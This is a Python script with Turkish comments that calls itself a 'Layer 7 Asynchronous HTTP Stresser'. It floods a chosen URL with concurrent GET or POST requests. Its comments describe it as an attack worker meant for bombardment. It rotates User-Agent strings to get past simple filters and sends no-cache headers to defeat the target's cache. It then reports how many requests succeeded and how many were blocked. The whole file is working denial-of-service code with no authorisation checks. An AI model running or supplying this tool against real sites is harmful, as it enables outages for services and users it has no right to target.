import asyncio
import time
import argparse
import random
from collections import Counter
import aiohttp

# L7 testlerinde sunucu loglarını çeşitlendirmek ve basit filtreleri geçmek için User-Agent listesi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0"
]

class StressResult:
    def __init__(self, status=0, error=None):
        self.status = status
        self.error = error

async def send_l7_request(session: aiohttp.ClientSession, url: str, method: str, data: str = None) -> StressResult:
    """Gelişmiş L7 HTTP isteği gönderir."""
    # Her istek için rastgele header üreterek hedef sunucunun cache mekanizmasını (önbellek) aşmaya çalışıyoruz
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive" # TCP bağlantısını açık tutarak L7 seviyesinde bombardıman sağlar
    }
    
    try:
        if method.upper() == "POST":
            async with session.post(url, headers=headers, data=data, timeout=5) as response:
                await response.release()
                return StressResult(status=response.status)
        else: # GET
            async with session.get(url, headers=headers, timeout=5) as response:
                await response.release()
                return StressResult(status=response.status)
    except Exception as e:
        return StressResult(status=0, error=str(type(e).__name__))

async def flood_worker(url: str, method: str, data: str, queue: asyncio.Queue, session: aiohttp.ClientSession, stats: list):
    """Kuyruk boşalana kadar hedefe kesintisiz istek gönderen L7 saldırı worker'ı."""
    while True:
        job = await queue.get()
        if job is None:
            queue.task_done()
            break
        
        result = await send_l7_request(session, url, method, data)
        stats.append(result)
        queue.task_done()

async def main():
    parser = argparse.ArgumentParser(description="Layer 7 Asenkron HTTP Stresser (GitHub Edition)")
    parser.add_argument("-url", required=True, help="Hedef URL (Örn: https://target.com/api)")
    parser.add_argument("-m", choices=["GET", "POST"], default="GET", help="HTTP Metodu (GET veya POST)")
    parser.add_argument("-n", type=int, default=500, help="Toplam gönderilecek istek sayısı")
    parser.add_argument("-c", type=int, default=50, help="Eşzamanlılık seviyesi (Concurrency / Eşzamanlı Worker)")
    parser.add_argument("-d", type=str, default=None, help="POST metodu için gönderilecek veri (Örn: 'username=test&pass=123')")
    args = parser.parse_args()

    print(f"⚠️  L7 STRESS TESTİ BAŞLATILIYOR ⚠️")
    print(f"Target URL : {args.url}")
    print(f"Method     : {args.m}")
    print(f"Worker (C) : {args.c} | Toplam İstek (N): {args.n}")
    print("-" * 60)

    start_time = time.perf_counter()
    queue = asyncio.Queue()
    stats = []

    # Kuyruğa işlerin doldurulması
    for _ in range(args.n):
        await queue.put(1)
    for _ in range(args.c):
        await queue.put(None)

    # L7 saldırılarında yüksek eşzamanlılık için TCP konnektör limiti optimize edilir
    connector = aiohttp.TCPConnector(limit=args.c, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        workers = []
        for _ in range(args.c):
            task = asyncio.create_task(flood_worker(args.url, args.m, args.d, queue, session, stats))
            workers.append(task)
        
        await queue.join()
        await asyncio.gather(*workers)

    duration = time.perf_counter() - start_time

    # --- ANALİZ VE RAPORLAMA ---
    status_distribution = Counter()
    success = 0
    errors = 0

    for res in stats:
        if res.error:
            errors += 1
            status_distribution[res.error] += 1
        else:
            status_distribution[res.status] += 1
            if 200 <= res.status < 400:
                success += 1
            else:
                errors += 1

    print("\n================= TEST RAPORU =================")
    print(f"Saldırı Süresi   : {duration:.2f} saniye")
    print(f"İstek Hızı (RPS) : {args.n / duration:.2f} req/sec")
    print(f"Başarılı Yanıt   : {success}")
    print(f"Hata / Engelleme : {errors}")
    print("\nDurum Kodları ve Log Dağılımı:")
    for status, count in status_distribution.items():
        prefix = "🟢 HTTP" if isinstance(status, int) and 200 <= status < 400 else "🔴 Hata/HTTP"
        print(f"  {prefix} [{status}]: {count} adet")
    print("===============================================")

if __name__ == "__main__":
    asyncio.run(main())
